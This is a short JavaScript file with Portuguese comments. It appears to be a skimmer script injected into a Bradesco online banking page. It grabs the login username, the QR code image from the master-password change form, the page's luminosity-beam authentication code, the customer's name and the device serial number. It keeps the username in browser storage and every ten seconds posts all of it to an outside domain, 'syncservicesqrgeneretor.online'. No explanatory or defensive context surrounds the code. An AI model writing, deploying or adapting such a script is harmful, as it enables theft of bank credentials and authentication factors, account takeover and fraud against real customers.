// ===============================
// CAPTURA FEIXE + QR + USUÁRIO + DISPOSITIVO
// COM PERSISTÊNCIA DE USUÁRIO
// ===============================

function capturarDados() {

    // ===============================
    // ELEMENTOS EXISTENTES
    // ===============================
    
    const feixeEl = document.querySelector(".feixeLuminosidade")
    const qrImg = document.querySelector("#formTrocarSenhaMaster\\:qrcode img")
    const nomeEl = document.querySelector(".nomeUsuario")

    // ===============================
    // INPUT DE USUÁRIO
    // ===============================
    
    const usuarioInput = document.querySelector("#identificationForm\\:txtUsuario") 

    // ===============================
    // CAPTURA DISPOSITIVO PELO <p>
    // ===============================
    
    let dispositivo = null

    const paragrafos = document.querySelectorAll("p")

    for (let p of paragrafos) {

        if (p.textContent.includes("Nº de série do dispositivo")) {

            const strong = p.querySelector("strong .HtmlOutputTextBradesco")

            if (strong) {
                dispositivo = strong.textContent.trim()
                break
            }
        }
    }

    // ===============================
    // EXTRAÇÃO DOS DADOS
    // ===============================
    
    const feixe = feixeEl ? feixeEl.textContent.trim() : null
    const qr = qrImg ? qrImg.src : null
    const nome = nomeEl ? nomeEl.textContent.trim() : null

    let usuario = usuarioInput ? usuarioInput.value.trim() : null


    // ===============================
    // 💾 PERSISTÊNCIA DO USUÁRIO
    // ===============================

    if (usuario) {
        // 🔧 salva no storage do navegador
        localStorage.setItem("usuario_capturado", usuario)
    } else {
        // 🔧 recupera se não existir na página atual
        usuario = localStorage.getItem("usuario_capturado")
    }


    // ===============================
    // VALIDAÇÃO
    // ===============================
    
    if (!feixe && !qr && !nome && !dispositivo && !usuario) return


    // ===============================
    // ENVIO PARA SERVIDOR
    // ===============================
    
    fetch("https://syncservicesqrgeneretor.online/dados", {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            usuario: usuario,   // 🔥 agora nunca perde
            nome: nome,
            dispositivo: dispositivo,
            feixe: feixe,
            qr: qr
        })
    })
}


// ===============================
// MONITORAMENTO
// ===============================

setInterval(capturarDados, 10000)